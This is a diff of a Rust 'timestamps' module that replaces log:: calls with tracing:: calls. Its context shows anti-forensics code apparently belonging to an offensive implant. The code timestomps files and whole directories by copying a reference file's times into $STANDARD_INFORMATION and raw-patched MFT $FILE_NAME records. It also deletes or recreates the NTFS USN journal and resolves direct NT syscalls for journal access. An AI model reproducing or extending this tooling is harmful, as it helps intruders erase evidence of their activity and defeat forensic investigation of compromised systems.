@@ -191,14 +191,14 @@ unsafe fn build_mft_layout(volume_handle: *mut std::ffi::c_void) -> MftLayout {
             let bytes_per_sector = u16::from_le_bytes([boot[0x0B], boot[0x0C]]) as u64;
             let sectors_per_cluster = boot[0x0D] as u64;
             if bytes_per_sector == 0 || sectors_per_cluster == 0 {
-                log::warn!("timestamps: invalid boot sector geometry, using defaults");
+                tracing::warn!("timestamps: invalid boot sector geometry, using defaults");
                 4096 // common default
             } else {
                 bytes_per_sector * sectors_per_cluster
             }
         }
         _ => {
-            log::warn!("timestamps: failed to read boot sector, using defaults");
+            tracing::warn!("timestamps: failed to read boot sector, using defaults");
             4096
         }
     };
@@ -226,19 +226,19 @@ unsafe fn build_mft_layout(volume_handle: *mut std::ffi::c_void) -> MftLayout {
                 record_buf[0x1F],
             ]) as usize;
             if allocated >= 512 && allocated <= 4096 && (allocated & 0x1FF) == 0 {
-                log::debug!("timestamps: detected MFT record size = {}", allocated);
+                tracing::debug!("timestamps: detected MFT record size = {}", allocated);
                 allocated
             } else {
-                log::warn!("timestamps: implausible MFT record size ({})", allocated);
+                tracing::warn!("timestamps: implausible MFT record size ({})", allocated);
                 DEFAULT_MFT_RECORD_SIZE
             }
         }
         Ok(n) => {
-            log::warn!("timestamps: short/invalid MFT record 0 read ({} bytes)", n);
+            tracing::warn!("timestamps: short/invalid MFT record 0 read ({} bytes)", n);
             DEFAULT_MFT_RECORD_SIZE
         }
         Err(e) => {
-            log::warn!("timestamps: failed to read MFT record 0: {}", e);
+            tracing::warn!("timestamps: failed to read MFT record 0: {}", e);
             DEFAULT_MFT_RECORD_SIZE
         }
     };
@@ -249,18 +249,18 @@ unsafe fn build_mft_layout(volume_handle: *mut std::ffi::c_void) -> MftLayout {
     let runs = if remove_mft_fixup(&mut record0).is_ok() {
         match parse_mft_data_runs(&record0, bytes_per_cluster) {
             Some(r) if !r.is_empty() => {
-                log::debug!("timestamps: parsed {} MFT data runs", r.len());
+                tracing::debug!("timestamps: parsed {} MFT data runs", r.len());
                 r
             }
             _ => {
-                log::warn!(
+                tracing::warn!(
                     "timestamps: failed to parse $DATA data runs, using contiguous fallback"
                 );
                 contiguous_fallback(mft_start_lcn)
             }
         }
     } else {
-        log::warn!(
+        tracing::warn!(
             "timestamps: failed to remove fixup from MFT record 0, using contiguous fallback"
         );
         contiguous_fallback(mft_start_lcn)
@@ -376,7 +376,7 @@ fn parse_data_run_encoding(data: &[u8]) -> Option<Vec<MftDataRun>> {
         let off_bytes = ((header >> 4) & 0x0F) as usize;
 
         if len_bytes == 0 || pos + len_bytes + off_bytes > data.len() {
-            log::warn!("timestamps: invalid data run encoding at pos {}", pos);
+            tracing::warn!("timestamps: invalid data run encoding at pos {}", pos);
             return None;
         }
 
@@ -1118,7 +1118,7 @@ fn remove_mft_fixup(record: &mut [u8]) -> Result<(), String> {
 
         // Verify the signature matches.
         if current_value != signature {
-            log::warn!(
+            tracing::warn!(
                 "timestamps: MFT fixup signature mismatch at sector {} (expected {:#06X}, found {:#06X})",
                 i, signature, current_value
             );
@@ -1218,7 +1218,7 @@ fn patch_fn_timestamps(
                 if offset + 8 <= record.len() {
                     record[offset..offset + 8].copy_from_slice(&value.to_le_bytes());
                 } else {
-                    log::warn!(
+                    tracing::warn!(
                         "timestamps: $FN timestamp offset {} out of bounds (record len {})",
                         offset,
                         record.len()
@@ -1227,14 +1227,14 @@ fn patch_fn_timestamps(
                 }
             }
 
-            log::debug!(
+            tracing::debug!(
                 "timestamps: patched $FN timestamps (creation={:#018X}, write={:#018X}, change={:#018X}, access={:#018X})",
                 creation_time as u64, last_write_time as u64, change_time as u64, last_access_time as u64
             );
             Ok(true)
         }
         None => {
-            log::warn!("timestamps: no $FILE_NAME attribute found in MFT record");
+            tracing::warn!("timestamps: no $FILE_NAME attribute found in MFT record");
             Ok(false)
         }
     }
@@ -1345,7 +1345,7 @@ unsafe fn find_usn_entries_for_file(
     let journal_id = match query_usn_journal_id(volume_handle) {
         Ok(id) => id,
         Err(e) => {
-            log::debug!("timestamps: could not query USN journal ID: {}", e);
+            tracing::debug!("timestamps: could not query USN journal ID: {}", e);
             return Ok(entries); // Non-fatal.
         }
     };
@@ -1390,7 +1390,7 @@ unsafe fn find_usn_entries_for_file(
         .map_err(|e| format!("nt_syscall resolution for FSCTL_READ_USN_JOURNAL: {e}"))?;
 
         if read_status != STATUS_SUCCESS {
-            log::debug!(
+            tracing::debug!(
                 "timestamps: USN journal read returned NTSTATUS {:#010X}",
                 read_status as u32
             );
@@ -1494,7 +1494,7 @@ unsafe fn clean_usn_entries(
         if status == STATUS_SUCCESS {
             cleaned += 1;
         } else {
-            log::debug!(
+            tracing::debug!(
                 "timestamps: FSCTL_WRITE_USN_CLOSE returned NTSTATUS {:#010X} for USN {}",
                 status as u32,
                 usn
@@ -1502,7 +1502,7 @@ unsafe fn clean_usn_entries(
         }
     }
 
-    log::debug!(
+    tracing::debug!(
         "timestamps: cleaned {} USN journal entries for file ref {:#018X}",
         cleaned,
         target_file_ref
@@ -1546,7 +1546,7 @@ unsafe fn recreate_usn_journal(volume_handle: *mut std::ffi::c_void) -> Result<(
         0,
     );
 
-    log::debug!(
+    tracing::debug!(
         "timestamps: recreated USN journal (old ID={:#018X})",
         journal_id
     );
@@ -1563,7 +1563,7 @@ pub fn init_from_config(cfg: &TimestampConfig) {
     }
     let _ = CONFIG.set(cfg.clone());
     INITIALIZED.store(true, Ordering::Release);
-    log::info!(
+    tracing::info!(
         "timestamps: initialised (sync_si_fn={}, usn_cleanup={}, ref={})",
         cfg.sync_si_and_fn,
         cfg.usn_cleanup,
@@ -1600,7 +1600,7 @@ pub unsafe fn timestomp_file(file_path: &[u16], reference_path: &[u16]) -> Resul
     });
 
     let ref_info = nt_query_basic_info(ref_handle)?;
-    log::debug!(
+    tracing::debug!(
         "timestamps: reference file times — creation={:#018X}, access={:#018X}, write={:#018X}, change={:#018X}",
         ref_info.creation_time as u64, ref_info.last_access_time as u64,
         ref_info.last_write_time as u64, ref_info.change_time as u64
@@ -1628,7 +1628,7 @@ pub unsafe fn timestomp_file(file_path: &[u16], reference_path: &[u16]) -> Resul
     };
 
     nt_set_basic_info(target_handle, &new_info)?;
-    log::debug!("timestamps: patched $STANDARD_INFORMATION timestamps");
+    tracing::debug!("timestamps: patched $STANDARD_INFORMATION timestamps");
 
     // ── Step 3: Optionally patch $FILE_NAME timestamps ───────────────
 
@@ -1638,7 +1638,7 @@ pub unsafe fn timestomp_file(file_path: &[u16], reference_path: &[u16]) -> Resul
     if sync_fn {
         // Get the MFT record number for the target file.
         let mft_record_number = nt_query_internal_info(target_handle)?;
-        log::debug!(
+        tracing::debug!(
             "timestamps: target MFT record number = {}",
             mft_record_number
         );
@@ -1665,11 +1665,11 @@ pub unsafe fn timestomp_file(file_path: &[u16], reference_path: &[u16]) -> Resul
                 ref_info.change_time,
                 ref_info.last_access_time,
             ) {
-                Ok(true) => log::debug!("timestamps: patched $FILE_NAME timestamps via MFT"),
-                Ok(false) => log::warn!(
+                Ok(true) => tracing::debug!("timestamps: patched $FILE_NAME timestamps via MFT"),
+                Ok(false) => tracing::warn!(
                     "timestamps: could not patch $FILE_NAME (attribute not found or out of bounds)"
                 ),
-                Err(e) => log::warn!("timestamps: $FILE_NAME patch failed: {}", e),
+                Err(e) => tracing::warn!("timestamps: $FILE_NAME patch failed: {}", e),
             }
 
             // ── Step 4: Clean USN journal ────────────────────────────
@@ -1677,16 +1677,16 @@ pub unsafe fn timestomp_file(file_path: &[u16], reference_path: &[u16]) -> Resul
             if do_usn_cleanup {
                 let file_ref = (mft_record_number as u64) & 0x0000FFFFFFFFFFFF;
                 match clean_usn_entries(volume_handle, file_ref) {
-                    Ok(n) => log::debug!("timestamps: cleaned {} USN journal entries", n),
-                    Err(e) => log::warn!("timestamps: USN cleanup failed: {}", e),
+                    Ok(n) => tracing::debug!("timestamps: cleaned {} USN journal entries", n),
+                    Err(e) => tracing::warn!("timestamps: USN cleanup failed: {}", e),
                 }
             }
         } else {
-            log::warn!("timestamps: could not open volume handle for $FN patching and USN cleanup");
+            tracing::warn!("timestamps: could not open volume handle for $FN patching and USN cleanup");
         }
     }
 
-    log::info!(
+    tracing::info!(
         "timestamps: timestomp complete for {}",
         wide_to_string(file_path)
     );
@@ -1767,18 +1767,18 @@ pub unsafe fn timestomp_directory(
         full_path.push(0); // Null terminator.
 
         let file_str = wide_to_string(&full_path);
-        log::debug!("timestamps: timestomping {}", file_str);
+        tracing::debug!("timestamps: timestomping {}", file_str);
 
         match timestomp_file(&full_path, reference_path) {
             Ok(()) => stomped += 1,
             Err(e) => {
-                log::warn!("timestamps: failed to timestomp {}: {}", file_str, e);
+                tracing::warn!("timestamps: failed to timestomp {}: {}", file_str, e);
                 errors += 1;
             }
         }
     }
 
-    log::info!(
+    tracing::info!(
         "timestamps: directory timestomp complete for {} ({} files, {} errors)",
         dir_str,
         stomped,
@@ -1811,11 +1811,11 @@ pub unsafe fn clean_usn_journal(volume: &[u16]) -> Result<(), String> {
     // by recreating it.
     match recreate_usn_journal(volume_handle) {
         Ok(()) => {
-            log::info!("timestamps: USN journal recreated successfully");
+            tracing::info!("timestamps: USN journal recreated successfully");
             Ok(())
         }
         Err(e) => {
-            log::warn!("timestamps: USN journal recreation failed: {}", e);
+            tracing::warn!("timestamps: USN journal recreation failed: {}", e);
             Err(e)
         }
     }
@@ -1835,11 +1835,11 @@ pub unsafe fn clean_usn_journal(volume: &[u16]) -> Result<(), String> {
 /// * `reference_path` — Reference file whose timestamps will be used.
 pub unsafe fn sync_timestamps(file_path: &[u16], reference_path: &[u16]) -> Result<(), String> {
     if !is_enabled() {
-        log::debug!("timestamps: sync_timestamps called but module not enabled, skipping");
+        tracing::debug!("timestamps: sync_timestamps called but module not enabled, skipping");
         return Ok(());
     }
 
-    log::debug!(
+    tracing::debug!(
         "timestamps: sync_timestamps — target={}, ref={}",
         wide_to_string(file_path),
         wide_to_string(reference_path)
